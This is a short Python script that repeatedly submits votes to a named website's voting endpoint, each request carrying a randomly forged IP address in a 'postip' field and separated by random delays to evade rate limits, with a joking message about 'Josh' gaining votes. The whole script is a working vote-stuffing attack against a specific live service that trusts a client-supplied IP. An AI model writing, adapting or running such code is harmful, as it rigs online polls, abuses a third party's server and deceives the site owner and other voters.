import requests
from random import randint
from time import sleep

url = 'http://www.matthewlush.com/VotingSystem/submitVote.php'

vote = 0
while True:
    vote+= 1
    fakeip = str(randint(90,180))+"."+str(randint(90,180))+"."+str(randint(90,180))+"."+str(randint(90,180))
    postVars = { "postperson":7,"postip":fakeip }

    kek = requests.post(url, params=postVars)
    if (kek.text == "1f u c4n r34d th1s u r34lly n33d t0 g37 l41d."):
        print("Josh is " + str(vote) + " " + "votes closer to meeting his lover")
    sleepTime= randint(5,15)
    print ("Waiting for " + str(sleepTime) + " " +  "seconds")
    sleep(sleepTime)
